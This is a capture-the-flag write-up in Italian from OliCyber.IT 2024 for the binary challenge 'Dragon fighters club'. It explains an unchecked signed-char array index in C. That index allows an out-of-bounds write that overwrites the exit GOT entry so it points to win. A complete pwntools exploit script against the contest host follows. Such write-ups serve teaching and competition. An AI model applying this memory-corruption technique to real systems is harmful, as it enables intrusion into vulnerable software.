# OliCyber.IT 2024 - Finale Nazionale

## [binary] Dragon fighters club (7 risoluzioni)

Sconfiggi tutti i draghi per entrare nel nostro club esclusivo! La gente dice che non è fattibile... Io dico che puoi trovare un modo :P

`nc dragonfightersclub.challs.olicyber.it 38303`

Author: Giulia Martino <@Giulia>

## Panoramica

La challenge è un binario che permette di combattere contro dei draghi. Sia tu che i draghi avete dei punti vita; quando combatti un drago, puoi sconfiggere solo quelli con meno punti vita dei tuoi. Ogni volta che sconfiggi un drago, i tuoi punti vita aumentano dei punti vita del drago e puoi infliggere un numero arbitrario di punti danno.

Quando riesci a portare tutti i punti vita dei draghi a zero, la funzione `win` viene chiamata, e la flag viene stampata in output. Uno dei draghi ha un numero molto alto di punti vita, quindi è praticamente impossibile vincere giocando solo in modo legittimo.

Agli utenti è fornito il binario della challenge insieme a un file `docker-compose.yml` utile per testare la challenge in locale.

## Vulnerabilità

I draghi sono implementati con una semplice struttura C. Dal codice sorgente:

```c
struct dragon {
    char *name;
    unsigned long hp;
};

struct dragon dragons[10] = {
    {.name = "Fire Dragon", .hp = 0x100},
    {.name = "Ice Dragon", .hp = 0x200},
    {.name = "Earth Dragon", .hp = 0x300},
    {.name = "Wind Dragon", .hp = 0x500},
    {.name = "Water Dragon", .hp = 0x1a00},
    {.name = "Electric Dragon", .hp = 0x3000},
    {.name = "Metal Dragon", .hp = 0x4500},
    {.name = "Dark Dragon", .hp = 0xa000},
    {.name = "Light Dragon", .hp = 0x14000},
    {.name = "Poison Dragon", .hp = 0x7fffffffffffffff},
};
```

La funzione `fight` ci permette di selezionare uno dei draghi a disposizione e combatterlo. Il codice parsa un signed char (`hhd`) da stdin usando `scanf` e poi lo usa come indice per l'array `dragons`.

```c
    if (scanf("%hhd", &choice) != 1)
            die("Invalid choice");
        
        dragon = &dragons[choice];
```

Il problema è che non viene effettuato alcun controllo sulla variabile `choice`, che quindi può essere utilizzata per accedere out of bounds all'array `dragons`.

## Soluzione

Il controllo mancante ci permette di utilizzare qualsiasi indice vogliamo, purché possa essere contenuto in un `signed char`. Selezionando un indice out of bounds, il programma interpreterà la memoria trovata a quell'indice come se fosse una `struct dragon`, quindi:
- i primi 8 byte trovati saranno interpretati come un puntatore al nome del drago.
- i secondi 8 byte trovati saranno interpretati come i punti vita del drago.

Considerando che quando si sconfigge un drago possiamo scegliere arbitrariamente un numero di punti danno, se riusciamo ad allineare correttamente un drago, possiamo modificare arbitrariamente gli 8 byte corrispondenti ai suoi punti vita sottraendogli il danno arbitrario.

L'array `dragons` è memorizzato nella sezione `.bss`, che si trova in memoria poco dopo la sezione GOT. La GOT memorizza l'indirizzo in memoria delle funzioni importate dalle librerie esterne, ad esempio `libc`. Il binario è `Partial RELRO`, il che significa che la sua GOT è scrivibile e gli indirizzi delle funzioni vengono risolti la prima volta che le funzioni stesse vengono chiamate. Quando un programma chiama una funzione esterna per la prima volta, la sua entry in GOT punta all'interno dell'eseguibile stesso, a uno stub di codice dedicato necessario per calcolare l'indirizzo reale della funzione nella libreria esterna. Una volta che il suo indirizzo nella libreria esterna è calcolato (risolto), viene scritto nuovamente in GOT.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Se allineiamo una `struct dragon` sulla GOT, possiamo poi utilizzare i punti danno per modificare una delle sue voci in modo che punti a una posizione diversa, possibilmente alla funzione `win`. La prossima volta che quella funzione verrà chiamata, il programma chiamerà effettivamente la funzione `win`.

Tra tutte le possibili voci della GOT, quella di `exit` è molto conveniente: l'indirizzo della funzione non è ancora stato risolto, quindi la sua voce punta all'interno del binario stesso e il suo valore è relativamente vicino all'indirizzo di `win`. Utilizzando un valore negativo per l'indice del drago (specificamente -5) possiamo allineare un drago sulla GOT in modo che gli 8 byte corrispondenti ai punti vita del drago siano allineati con l'entrata di `exit` in GOT.

Se proviamo direttamente a combatterlo, ci accorgiamo che non possiamo sconfiggerlo, perché abbiamo bisogno che i nostri punti vita siano superiori all'indirizzo di `exit` in GOT. Possiamo iniziare il nostro exploit combattendo più volte gli altri draghi, in modo da aumentare i nostri punti vita a una quantità sufficiente per sconfiggere il drago in `exit` in GOT.

Dobbiamo quindi calcolare la distanza tra l'indirizzo non ancora risolto dell'entry di `exit` e la funzione `win`. Sconfiggendo il drago e impostando il valore di danno arbitrario a questa distanza, modificheremo l'entrata di `exit` in modo che punti a `win`. E poi possiamo semplicemente uscire dal programma.

## Exploit

```python
#!/usr/bin/env python3

import logging
import os
from pwn import *

logging.disable()

filename = os.path.join(os.path.dirname(__file__), "dragon_fighters_club")
exe = context.binary = ELF(args.EXE or filename, checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get("HOST", "dragonfightersclub.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38303))
POW_BYPASS = '736ce3308158c9bdf0eb0d4e2701c93c'

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process([exe.path] + argv, *a, **kw)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote(HOST, PORT)

gdbscript = '''
'''.format(**locals())

# ==========================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
io.sendlineafter(b"Result:", f"99:{POW_BYPASS}".encode())

def you():
    io.sendlineafter(b"> ", b"1")
    res = io.recvline().strip().decode()
    return res

def dragons():
    io.sendlineafter(b"> ", b"2")
    res = b''.join(io.recvlines(10, keepends=True)).strip().decode()
    return res

def fight(i, damage):
    io.sendlineafter(b"> ", b"3");
    io.sendlineafter(b"> ", f"{i}".encode())
    res = io.recvline()
    if b"die?" in res:
        print(f"Cant fight {i} :(")
        return
    io.sendline(f"{damage}".encode())

def check_win():
    io.sendlineafter(b"> ", b"4")

def exit():
    io.sendlineafter(b"> ", b"5")

# Just getting enough points to beat exit's GOT dragon
for i in range(8):
    fight(i, 100)
for _ in range(75):
    fight(8, 1)

WIN = exe.symbols["win"]
EXIT_GOT = 0x04010b0

fight(-5, EXIT_GOT - WIN) # Overwrite exit's GOT with win
exit()

if args.GDB:
    io.interactive()
else:
    res = io.recvuntil(b"flag{").strip()
    print('flag{' + io.recvuntil(b'}').strip().decode())
```
